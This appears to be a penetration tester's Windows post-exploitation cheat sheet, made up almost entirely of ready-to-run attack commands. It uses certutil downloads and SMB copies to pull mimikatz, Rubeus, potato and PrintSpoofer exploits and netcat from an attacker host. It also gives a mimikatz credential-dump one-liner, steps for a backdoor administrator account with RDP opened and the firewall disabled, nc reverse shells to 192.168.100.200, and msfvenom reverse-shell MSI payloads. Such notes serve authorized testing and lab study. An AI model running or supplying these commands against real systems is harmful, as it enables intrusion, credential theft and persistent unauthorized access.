# Powershell
```powershell
powershell -ep bypass
```
## SMB copy
```powershell
net use z: \\192.168.100.200\exfil kali /user:kali
copy z:\PowerView.ps1 C:\ProgramData\
copy z:\winPEASx64.exe C:\ProgramData\
copy z:\winPEASany.exe C:\ProgramData\
copy z:\winPEASx86.exe C:\ProgramData\
copy z:\SigmaPotato.exe C:\ProgramData\
copy z:\GodPotato-NET4.exe C:\ProgramData\
copy z:\nc.exe C:\ProgramData\
copy z:\Rubeus.exe C:\ProgramData\
copy z:\mimikatz86.exe C:\ProgramData\
copy z:\mimikatz64.exe C:\ProgramData\
copy z:\powercat.ps1 C:\ProgramData\
copy z:\SharpHound.ps1 C:\ProgramData\
copy z:\SharpHound.exe C:\ProgramData\
copy z:\CVE-2023-29360_smartscreen.exe C:\ProgramData\
copy z:\Seatbelt.exe C:\ProgramData\
copy z:\PrintSpoofer32.exe C:\ProgramData\
copy z:\PrintSpoofer64.exe C:\ProgramData\
copy z:\windows-privesc-check.exe C:\ProgramData\
copy z:\agent.exe C:\ProgramData\
copy z:\kerbrute_windows_386.exe C:\ProgramData\
copy z:\kerbrute_windows_amd64.exe C:\ProgramData\
cd C:\ProgramData
Import-Module C:\ProgramData\powercat.ps1
Import-Module C:\ProgramData\PowerView.ps1
Import-Module C:\ProgramData\SharpHound.ps1
```
## HTTP download (imagine changing IP address)
```powershell
certutil -f -urlcache http://192.168.100.200/powershell-related/PowerView.ps1 C:/ProgramData/PowerView.ps1
certutil -f -urlcache http://192.168.100.200/powershell-related/powercat.ps1 C:/ProgramData/powercat.ps1
certutil -f -urlcache http://192.168.100.200/peass/winPEASx64.exe C:/ProgramData/winPEASx64.exe
certutil -f -urlcache http://192.168.100.200/peass/winPEASany.exe C:/ProgramData/winPEASany.exe
certutil -f -urlcache http://192.168.100.200/peass/winPEASx86.exe C:/ProgramData/winPEASx86.exe
certutil -f -urlcache http://192.168.100.200/potato/SigmaPotato.exe C:/ProgramData/SigmaPotato.exe
certutil -f -urlcache http://192.168.100.200/potato/GodPotato-NET4.exe C:/ProgramData/GodPotato-NET4.exe
certutil -f -urlcache http://192.168.100.200/WinBinaries/nc.exe C:/ProgramData/nc.exe
certutil -f -urlcache http://192.168.100.200/kerberoast/Rubeus.exe C:/ProgramData/Rubeus.exe
certutil -f -urlcache http://192.168.100.200/mimikatz/Win32/mimikatz.exe C:/ProgramData/mimikatz86.exe
certutil -f -urlcache http://192.168.100.200/mimikatz/x64/mimikatz.exe C:/ProgramData/mimikatz64.exe
certutil -f -urlcache http://192.168.100.200/SharpHound-v1.1.1/SharpHound.exe C:/ProgramData/SharpHound.exe
certutil -f -urlcache http://192.168.100.200/Seatbelt/Seatbelt.exe C:/ProgramData/Seatbelt.exe
certutil -f -urlcache http://192.168.100.200/windows-exploits/CVE-2023-29360-streamingservicepolicy/CVE-2023-29360.exe C:/ProgramData/CVE-2023-29360_smartscreen.exe
certutil -f -urlcache http://192.168.100.200/windows-exploits/privesc/PrintSpoofer32.exe C:/ProgramData/PrintSpoofer32.exe
certutil -f -urlcache http://192.168.100.200/windows-exploits/privesc/PrintSpoofer64.exe C:/ProgramData/PrintSpoofer64.exe
certutil -f -urlcache http://192.168.100.200/windows-exploits/privesc/windows-privesc-check.exe C:/ProgramData/windows-privesc-check.exe
certutil -f -urlcache http://192.168.100.200/ligolo/windows_amd64_0.6.2/agent.exe C:/ProgramData/agent.exe
certutil -f -urlcache http://192.168.100.200/kerberoast/kerbrute_windows_386.exe C:/ProgramData/kerbrute_windows_386.exe
certutil -f -urlcache http://192.168.100.200/kerberoast/kerbrute_windows_amd64.exe C:/ProgramData/kerbrute_windows_amd64.exe
cd C:\ProgramData
Import-Module C:\ProgramData\powercat.ps1
Import-Module C:\ProgramData\PowerView.ps1
Import-Module C:\ProgramData\SharpHound.ps1
```

# CMD
## SMB copy
```cmd
net use z: \\192.168.100.200\exfil kali /user:kali
copy z:\PowerView.ps1 C:\ProgramData\
copy z:\winPEASx64.exe C:\ProgramData\
copy z:\winPEASany.exe C:\ProgramData\
copy z:\winPEASx86.exe C:\ProgramData\
copy z:\SigmaPotato.exe C:\ProgramData\
copy z:\GodPotato-NET4.exe C:\ProgramData\
copy z:\nc.exe C:\ProgramData\
copy z:\Rubeus.exe C:\ProgramData\
copy z:\mimikatz86.exe C:\ProgramData\
copy z:\mimikatz64.exe C:\ProgramData\
copy z:\powercat.ps1 C:\ProgramData\
copy z:\SharpHound.ps1 C:\ProgramData\
copy z:\SharpHound.exe C:\ProgramData\
copy z:\CVE-2023-29360_smartscreen.exe C:\ProgramData\
copy z:\Seatbelt.exe C:\ProgramData\
copy z:\PrintSpoofer32.exe C:\ProgramData\
copy z:\PrintSpoofer64.exe C:\ProgramData\
copy z:\windows-privesc-check.exe C:\ProgramData\
copy z:\agent.exe C:\ProgramData\
copy z:\kerbrute_windows_386.exe C:\ProgramData\
copy z:\kerbrute_windows_amd64.exe C:\ProgramData\
cd C:\ProgramData
```
## HTTP download (imagine changing IP address)
```cmd
certutil -f -urlcache http://192.168.100.200/powershell-related/PowerView.ps1 C:/ProgramData/PowerView.ps1
certutil -f -urlcache http://192.168.100.200/powershell-related/powercat.ps1 C:/ProgramData/powercat.ps1
certutil -f -urlcache http://192.168.100.200/peass/winPEASx64.exe C:/ProgramData/winPEASx64.exe
certutil -f -urlcache http://192.168.100.200/peass/winPEASany.exe C:/ProgramData/winPEASany.exe
certutil -f -urlcache http://192.168.100.200/peass/winPEASx86.exe C:/ProgramData/winPEASx86.exe
certutil -f -urlcache http://192.168.100.200/potato/SigmaPotato.exe C:/ProgramData/SigmaPotato.exe
certutil -f -urlcache http://192.168.100.200/potato/GodPotato-NET4.exe C:/ProgramData/GodPotato-NET4.exe
certutil -f -urlcache http://192.168.100.200/WinBinaries/nc.exe C:/ProgramData/nc.exe
certutil -f -urlcache http://192.168.100.200/kerberoast/Rubeus.exe C:/ProgramData/Rubeus.exe
certutil -f -urlcache http://192.168.100.200/mimikatz/Win32/mimikatz.exe C:/ProgramData/mimikatz86.exe
certutil -f -urlcache http://192.168.100.200/mimikatz/x64/mimikatz.exe C:/ProgramData/mimikatz64.exe
certutil -f -urlcache http://192.168.100.200/SharpHound-v1.1.1/SharpHound.exe C:/ProgramData/SharpHound.exe
certutil -f -urlcache http://192.168.100.200/Seatbelt/Seatbelt.exe C:/ProgramData/Seatbelt.exe
certutil -f -urlcache http://192.168.100.200/windows-exploits/CVE-2023-29360-streamingservicepolicy/CVE-2023-29360.exe C:/ProgramData/CVE-2023-29360_smartscreen.exe
certutil -f -urlcache http://192.168.100.200/windows-exploits/privesc/PrintSpoofer32.exe C:/ProgramData/PrintSpoofer32.exe
certutil -f -urlcache http://192.168.100.200/windows-exploits/privesc/PrintSpoofer64.exe C:/ProgramData/PrintSpoofer64.exe
certutil -f -urlcache http://192.168.100.200/windows-exploits/privesc/windows-privesc-check.exe C:/ProgramData/windows-privesc-check.exe
certutil -f -urlcache http://192.168.100.200/ligolo/windows_amd64_0.6.2/agent.exe C:/ProgramData/agent.exe
certutil -f -urlcache http://192.168.100.200/kerberoast/kerbrute_windows_386.exe C:/ProgramData/kerbrute_windows_386.exe
certutil -f -urlcache http://192.168.100.200/kerberoast/kerbrute_windows_amd64.exe C:/ProgramData/kerbrute_windows_amd64.exe
cd C:\ProgramData
```


# mimikatz one line
```bash
.\mimikatz64.exe "privilege::debug" "sekurlsa::logonpasswords" exit
```

# New Admin + RDP + Remote Assistance + Firewall open port combo
If it does not work, execute the steps separately instead
```powershell
net user username Password123! /add
net localgroup administrators username /add 
net localgroup "Remote Desktop Users" username /add
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fAllowToGetHelp /t REG_DWORD /d 1 /f
netsh firewall add portopening TCP 3389 "Remote Desktop"
netsh firewall set service remoteadmin enable
net user
net localgroup administrators
net user username
```
## Turn off Firewall if required
```powershell
netsh Advfirewall set allprofiles state off
```
## Enable RDP if not available
```powershell
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
netsh firewall add portopening TCP 3389 "Remote Desktop"
```
### With wmic
```powershell
wmic rdtoggle where AllowTSConnections="0" call SetAllowTSConnections "1"
```
OR
```powershell
wmic /node:remotehost path Win32_TerminalServiceSetting where AllowTSConnections="0" call SetAllowTSConnections "1"
```

# SeImpersonate PrivEsc

## Potato Reverse Shell
```powershell
SigmaPotato.exe "nc.exe 192.168.100.200 443 -e powershell"
```
## PrintSpoofer Reverse Shell
```powershell
PrintSpoofer64.exe -c "C:\ProgramData\nc.exe 192.168.100.200 443 -e cmd"
```
## Potato Mimikatz single line
```powershell
.\SigmaPotato.exe 'mimikatz64.exe "privilege::debug" "sekurlsa::logonpasswords" exit'
```
## Potato Run Elevated
```powershell
SigmaPotato.exe mimikatz64.exe
```
## PrintSpoofer Run Elevated
```powershell
PrintSpoofer64.exe -i -c mimikatz64.exe
```

# Seatbelt 
```powershell
Seatbelt.exe -group=all -full -outputfile="C:\ProgramData\seatbelt.txt"
```
> more info about other users in the system if elevated

# AlwaysInstallElevated

## msfvenom payload (add user)
```bash
msfvenom -p windows/adduser USER=username PASS=Password123! -f msi-nouac -o install.msi #No uac format
```

```powershell
certutil -f -urlcache http://192.168.100.200/install.msi C:/ProgramData/install.msi
C:/ProgramData/install.msi
net user
net localgroup administrators
net user username
```
### If unable to trigger
```powershell
msiexec.exe /i "C:\ProgramData\install.msi" /quiet
net user
net localgroup administrators
net user username
```

## msfvenom payload (reverse shell)
### x64
```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.100.200 LPORT=443 -f msi-nouac -o reverse_443.msi
```
### x86
```bash
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.100.200 LPORT=443 -f msi-nouac -o reverse_443.msi
```

```powershell
certutil -f -urlcache http://192.168.100.200/reverse_443.msi C:/ProgramData/reverse_443.msi
C:/ProgramData/reverse_443.msi
```
### If unable to trigger
```powershell
msiexec.exe /i "C:\ProgramData\reverse_443.msi" /quiet
```

# Restart now
```powershell
shutdown /r /t 0
```
